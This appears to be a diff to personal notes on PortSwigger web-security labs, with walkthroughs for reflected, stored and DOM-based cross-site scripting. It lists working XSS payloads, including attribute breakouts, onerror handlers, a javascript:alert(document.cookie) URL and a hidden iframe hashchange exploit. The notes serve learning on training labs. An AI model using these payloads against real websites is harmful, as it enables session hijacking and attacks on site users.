@@ -2,9 +2,16 @@
 
 ## methodology
 
-Simple payload:
+Payloads
 ```
+Simple
 <script>alert(1)</script>
+Close out attribute and created new
+"><svg onload=alert(1)>
+Escape quotes
+"onmouseover="alert(1)
+Break out of Javascript string
+'-alert(1)-'
 ```
 
 
@@ -26,3 +33,41 @@ Enter this as a comment
 - If we right click and inspect the page we can view that the random string we entered is placed inside the img src attribute
 - enter this payload to pop xss `"><svg onload=alert(1)>`
 
+### DOM XSS in innerHTML sink using source location.search
+
+- Inject this into the search box `<img src=1 onerror=alert(1)>`
+
+### DOM XSS in jQuery anchor href attribute sink using location.search source
+
+- On the submit feedback page, change the query parameter `returnPath` to `/` followed with some random string
+- right-click and inspect the element, and observe that your random string has been placed inside an `href` attribute
+- Now enter this: `javascript:alert(document.cookie)`
+
+### DOM XSS in jQuery selector sink using a hashchange event
+
+So we notice a hashchange value in the page, we control this variable and can put our JQuery xss in this value in the url.
+
+To exploit this we need to send an iframe with this payload in it
+
+```
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+We can add `hidden="hidden"` to hide our iframe on the browser
+
+### Reflected XSS into attribute with angle brackets HTML-encoded
+
+- Inject a string in the search box, review what the return is and see that your string is reflected
+- send this to repeater and notice your text is in a quoted `("")` attribute.
+- break the quote and send in payload like this `"onmouseover="alert(1)`
+
+### Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+- post comment with a random string in the website input
+- notice it is placed in an anchor `href` attribute
+- enter this payload `javascript:alert(1)`, to trigger right click in burp and select `"copy URL"` and paste it in your browser
+
+### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+- inject string like above
+- notice it is reflected inside a JavaScript string
+- break out of string with a payload like: `'-alert(1)-'`
